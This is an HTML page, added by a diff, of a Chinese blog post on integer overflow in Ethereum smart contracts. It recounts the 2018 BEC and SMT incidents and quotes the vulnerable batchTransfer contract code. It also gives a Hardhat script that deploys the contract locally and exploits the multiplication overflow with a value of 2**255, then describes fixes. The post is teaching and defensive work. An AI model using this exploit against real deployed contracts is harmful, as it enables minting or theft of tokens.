@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="概述整型溢出是智能合约中常见的漏洞之一。以太坊虚拟机对整数使用固定大小的数据类型，一个整数变量仅能表示一个固定范围的数值，比如uint8类型只能保存[0, 255]。当把超过某个数据类型范围的数值保存到这个变量时，就会产生溢出。例如  将一个uint8类型，值为0的变量进行减1操作时，计算结果会等于255，称为减法溢出 将一个uint8类型，值为255的变量进行加1操作时，计算结果会等于0，称为加">
+<meta name="keywords" content="以太坊,区块链,安全,智能合约">
+<meta property="og:type" content="article">
+<meta property="og:title" content="智能合约安全之整型溢出">
+<meta property="og:url" content="https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/index.html">
+<meta property="og:site_name" content="悖论の小黑屋">
+<meta property="og:description" content="概述整型溢出是智能合约中常见的漏洞之一。以太坊虚拟机对整数使用固定大小的数据类型，一个整数变量仅能表示一个固定范围的数值，比如uint8类型只能保存[0, 255]。当把超过某个数据类型范围的数值保存到这个变量时，就会产生溢出。例如  将一个uint8类型，值为0的变量进行减1操作时，计算结果会等于255，称为减法溢出 将一个uint8类型，值为255的变量进行加1操作时，计算结果会等于0，称为加">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://img.otaku.ren/20230514/integer-overflow.png">
+<meta property="og:updated_time" content="2024-01-04T13:55:46.688Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="智能合约安全之整型溢出">
+<meta name="twitter:description" content="概述整型溢出是智能合约中常见的漏洞之一。以太坊虚拟机对整数使用固定大小的数据类型，一个整数变量仅能表示一个固定范围的数值，比如uint8类型只能保存[0, 255]。当把超过某个数据类型范围的数值保存到这个变量时，就会产生溢出。例如  将一个uint8类型，值为0的变量进行减1操作时，计算结果会等于255，称为减法溢出 将一个uint8类型，值为255的变量进行加1操作时，计算结果会等于0，称为加">
+<meta name="twitter:image" content="https://img.otaku.ren/20230514/integer-overflow.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="https://www.gravatar.com/avatar/7386a5bf1f1b67ddfe8747d912582360">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/7386a5bf1f1b67ddfe8747d912582360" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/7386a5bf1f1b67ddfe8747d912582360">
+          
+        
+    
+    <!-- title -->
+    <title>智能合约安全之整型溢出</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/beilunyang">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2023/08/11/Slidev-更适合程序员使用的PPT制作工具/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2023/03/30/智能合约安全之重入攻击/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&text=智能合约安全之整型溢出"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&title=智能合约安全之整型溢出"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&is_video=false&description=智能合约安全之整型溢出"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=智能合约安全之整型溢出&body=Check out this article: https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&title=智能合约安全之整型溢出"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&title=智能合约安全之整型溢出"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&title=智能合约安全之整型溢出"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&title=智能合约安全之整型溢出"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&name=智能合约安全之整型溢出&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#重大事件"><span class="toc-number">2.</span> <span class="toc-text">重大事件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码演示"><span class="toc-number">3.</span> <span class="toc-text">代码演示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何修复和预防"><span class="toc-number">4.</span> <span class="toc-text">如何修复和预防</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结语"><span class="toc-number">5.</span> <span class="toc-text">结语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完整代码"><span class="toc-number">6.</span> <span class="toc-text">完整代码</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        智能合约安全之整型溢出
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">悖论の小黑屋</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-14T14:08:30.000Z" itemprop="datePublished">2023-05-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/以太坊/">以太坊</a>, <a class="tag-link" href="/tags/区块链/">区块链</a>, <a class="tag-link" href="/tags/安全/">安全</a>, <a class="tag-link" href="/tags/智能合约/">智能合约</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>整型溢出是智能合约中常见的漏洞之一。以太坊虚拟机对整数使用固定大小的数据类型，一个整数变量仅能表示一个固定范围的数值，比如uint8类型只能保存[0, 255]。当把超过某个数据类型范围的数值保存到这个变量时，就会产生溢出。例如</p>
+<ol>
+<li>将一个uint8类型，值为0的变量进行减1操作时，计算结果会等于255，称为减法溢出</li>
+<li>将一个uint8类型，值为255的变量进行加1操作时，计算结果会等于0，称为加法溢出</li>
+<li>将一个uint8类型，值为128的变量进行乘2操作时，计算结果会等于0，称为乘法溢出</li>
+</ol>
+<p>这种数字上的谬误会允许攻击者使用恶意代码来创造一些非预期的逻辑流程。</p>
+<h2 id="重大事件"><a href="#重大事件" class="headerlink" title="重大事件"></a>重大事件</h2><ul>
+<li>2018年4月22日，黑客利用整型溢出漏洞，对美链(BEC)发起攻击，无中生有，凭空取出57,896,044,618,658,100,000,000,000,000,000,000,000,000,000,000,000,000,000,000.792003956564819968个BEC代币，导致BEC价格近乎归零</li>
+<li>2018年4月25日，SMT项目方发现其交易存在异常，黑客利用其整型溢出漏洞创造了65,133,050,195,990,400,000,000,000,000,000,000,000,000,000,000,000,000,000,000.891004451135422463个SMT代币</li>
+</ul>
+<h2 id="代码演示"><a href="#代码演示" class="headerlink" title="代码演示"></a>代码演示</h2><p>使用hardhat创建合约工程，<code>scripts/attack.ts</code>为攻击流程演示代码，<code>contracts/BecToken</code>为漏洞合约代码。这里的合约直接使用了美链(BEC)的合约代码。</p>
+<p>部分合约代码:</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">library SafeMath &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">mul</span>(<span class="params">uint256 a, uint256 b</span>) <span class="title">internal</span> <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;</span><br><span class="line">    uint256 c = a * b;</span><br><span class="line">    assert(a == <span class="number">0</span> || c / a == b);</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">div</span>(<span class="params">uint256 a, uint256 b</span>) <span class="title">internal</span> <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// assert(b &gt; 0); // Solidity automatically throws when dividing by 0</span></span><br><span class="line">    uint256 c = a / b;</span><br><span class="line">    <span class="comment">// assert(a == b * c + a % b); // There is no case in which this doesn't hold</span></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">uint256 a, uint256 b</span>) <span class="title">internal</span> <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;</span><br><span class="line">    assert(b &lt;= a);</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">uint256 a, uint256 b</span>) <span class="title">internal</span> <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    assert(c &gt;= a);</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @title Pausable token</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @dev StandardToken modified with pausable transfers.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line">contract PausableToken is StandardToken, Pausable &#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="title">public</span> <span class="title">whenNotPaused</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">address _from, address _to, uint256 _value</span>) <span class="title">public</span> <span class="title">whenNotPaused</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.transferFrom(_from, _to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address _spender, uint256 _value</span>) <span class="title">public</span> <span class="title">whenNotPaused</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.approve(_spender, _value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// batchTransfer函数存在漏洞</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">batchTransfer</span>(<span class="params">address[] _receivers, uint256 _value</span>) <span class="title">public</span> <span class="title">whenNotPaused</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    uint cnt = _receivers.length;</span><br><span class="line">    <span class="comment">// 这一行没有考虑整型溢出</span></span><br><span class="line">    uint256 amount = uint256(cnt) * _value;</span><br><span class="line">    <span class="built_in">require</span>(cnt &gt; <span class="number">0</span> &amp;&amp; cnt &lt;= <span class="number">20</span>);</span><br><span class="line">    <span class="built_in">require</span>(_value &gt; <span class="number">0</span> &amp;&amp; balances[msg.sender] &gt;= amount);</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(amount);</span><br><span class="line">    <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; cnt; i++) &#123;</span><br><span class="line">        balances[_receivers[i]] = balances[_receivers[i]].add(_value);</span><br><span class="line">        Transfer(msg.sender, _receivers[i], _value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>攻击脚本代码:</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ethers &#125; <span class="keyword">from</span> <span class="string">"hardhat"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// deploy</span></span><br><span class="line">  <span class="keyword">const</span> [owner, attacker1, attacker2, attacker3] = <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line">  <span class="keyword">const</span> BecToken = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"BecToken"</span>);</span><br><span class="line">  <span class="keyword">const</span> becToken = <span class="keyword">await</span> BecToken.connect(owner).deploy();</span><br><span class="line">  <span class="keyword">await</span> becToken.deployed();</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`BecToken deployed successfully. The address is <span class="subst">$&#123;becToken.address&#125;</span>`</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'BecToken totalSupply:'</span>, <span class="keyword">await</span> becToken.totalSupply()); </span><br><span class="line">  <span class="comment">// attack</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'[before]attacker1 token num:'</span>, <span class="keyword">await</span> becToken.balanceOf(attacker1.address));</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'[before]attacker2 token num'</span>, <span class="keyword">await</span> becToken.balanceOf(attacker2.address));</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'[before]attacker3 token num'</span>, <span class="keyword">await</span> becToken.balanceOf(attacker3.address));</span><br><span class="line">  <span class="keyword">await</span> becToken.connect(attacker1).batchTransfer([attacker2.address, attacker3.address], BigInt(<span class="number">2</span>) ** BigInt(<span class="number">255</span>));</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'[after]attacker2 token num'</span>, <span class="keyword">await</span> becToken.balanceOf(attacker2.address));</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'[after]attacker3 token num'</span>, <span class="keyword">await</span> becToken.balanceOf(attacker3.address));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main().catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.error(error);</span><br><span class="line">  process.exitCode = <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<ol>
+<li>BSC合约考虑到了加法以及减法导致的整型溢出问题。使用了SafeMath的sub，add函数进行加减操作。</li>
+<li>然而忽略了<code>batchTransfer</code> 中 <code>uint256 amount = uint256(cnt) * _value;</code>  这一行代码。_value值为用户可控制的参数，却没有进行任何值的判断。攻击者可以轻松构造恶意参数请求，让<code>uint256(cnt) * _value</code> 溢出。</li>
+<li>攻击者直接调用<code>batchTransfer</code> 合约函数，传入两个账户地址<code>attacker2.address  attacker3.address</code> , 以及<code>_value 2**255</code> </li>
+<li><p>当使用构造的恶意参数时，<code>uint256 amount = uint256(cnt) * _value;</code>  发生乘法溢出，<code>amount</code>的值为0，成功绕过了<code>require(_value &gt; 0 &amp;&amp; balances[msg.sender] &gt;= amount);</code> 检查，向<code>_receivers</code>地址转入<code>2 ** 255</code>个token, 哪怕<code>msg.sender(attacker1)</code>账户下只有0个token，没有<code>2 ** 255</code>个token</p>
+<p> <img src="https://img.otaku.ren/20230514/integer-overflow.png" alt="integer-overflow.png"></p>
+</li>
+</ol>
+<h2 id="如何修复和预防"><a href="#如何修复和预防" class="headerlink" title="如何修复和预防"></a>如何修复和预防</h2><ol>
+<li>Solidity &lt; 0.8.0，使用openzeppelin提供的SafeMath库函数进行数值的加减乘除操作</li>
+<li>Solidity &gt;= 0.8.0, Solidity编译器自动集成SafeMath, 直接使用 <code>+ - * /</code> 即可，发生溢出时会自动回退交易</li>
+</ol>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>整型溢出是非常常见基础的智能合约漏洞，但在历史上也造成过巨额的资产损失。因此，合约开发人员还是要认真对待，使用SafeMath或使用Solidity0.8.0以上版本来预防整型溢出风险。</p>
+<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p><a href="https://github.com/demo-box/blockchain-demo/tree/main/integerOverflow" target="_blank" rel="noopener">https://github.com/demo-box/blockchain-demo/tree/main/integerOverflow</a></p>
+<p><a href="https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code" target="_blank" rel="noopener">https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code</a></p>
+
+  </div>
+</article>
+
+
+    <script src="https://utteranc.es/client.js" repo="beilunyang/beilunyang.github.io" issue-term="pathname" theme="photon-dark" crossorigin="anonymous" async>
+    </script>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/beilunyang">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#重大事件"><span class="toc-number">2.</span> <span class="toc-text">重大事件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码演示"><span class="toc-number">3.</span> <span class="toc-text">代码演示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何修复和预防"><span class="toc-number">4.</span> <span class="toc-text">如何修复和预防</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结语"><span class="toc-number">5.</span> <span class="toc-text">结语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完整代码"><span class="toc-number">6.</span> <span class="toc-text">完整代码</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&text=智能合约安全之整型溢出"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&title=智能合约安全之整型溢出"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&is_video=false&description=智能合约安全之整型溢出"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=智能合约安全之整型溢出&body=Check out this article: https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&title=智能合约安全之整型溢出"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&title=智能合约安全之整型溢出"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&title=智能合约安全之整型溢出"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&title=智能合约安全之整型溢出"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://beilunyang.github.io/2023/05/14/智能合约安全之整型溢出/&name=智能合约安全之整型溢出&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2024 beilunyang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/beilunyang">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?ff79330890944419b7024a1981a182d6";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
